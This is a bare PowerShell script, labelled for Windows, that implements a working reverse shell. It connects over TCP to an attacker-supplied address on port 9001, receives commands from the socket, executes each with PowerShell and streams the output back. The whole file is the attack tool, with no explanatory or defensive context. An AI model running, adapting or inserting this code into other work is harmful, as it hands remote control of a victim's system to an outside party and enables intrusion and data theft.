# windows
Add-Type -AssemblyName System.Net.Primitives
Add-Type -AssemblyName System.Net.Sockets

$LHOST = "IP_ADDRESS"
$LPORT = 9001

function Main {
    try {
        # Create TCP socket and connect
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($LHOST, $LPORT)

        $stream = $tcpClient.GetStream()
        $stream.ReadTimeout = 100
        $stream.WriteTimeout = 100

        $code = ""
        $bufferSize = 1024
        $buffer = New-Object byte[] $bufferSize

        while ($true) {
            try {
                if ($stream.DataAvailable) {
                    $bytesRead = $stream.Read($buffer, 0, $bufferSize)
                    if ($bytesRead -gt 0) {
                        $receivedCode = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                        $code += $receivedCode

                        if ($receivedCode -like "*`n*") {
                            $trimmedCode = $code.Trim()
                            if ($trimmedCode) {
                                try {
                                    # Execute the command and capture output
                                    $output = powershell -Command $trimmedCode 2>&1 | Out-String
                                }
                                catch {
                                    $output = $_.Exception.Message
                                }

                                $outputToSend = $output + "`n"
                                $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($outputToSend)
                                $stream.Write($outputBytes, 0, $outputBytes.Length)
                                $stream.Flush()
                                $code = ""
                            }
                        }
                    }
                }

                # Check if connection is still alive by sending zero bytes (simulate)
                if (-not $tcpClient.Connected) {
                    break
                }
            }
            catch [System.IO.IOException] {
                # Connection lost
                break
            }
            catch {
                try {
                    $errorMsg = "Error: $($_.Exception.Message)`n"
                    $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
                    $stream.Write($errorBytes, 0, $errorBytes.Length)
                    $stream.Flush()
                }
                catch {
                    break
                }
            }
            Start-Sleep -Milliseconds 100
        }
    }
    catch {
        Write-Host "Connection error: $($_.Exception.Message)"
    }
    finally {
        try {
            if ($stream) { $stream.Close() }
            if ($tcpClient) { $tcpClient.Close() }
        }
        catch {}
    }
}

Main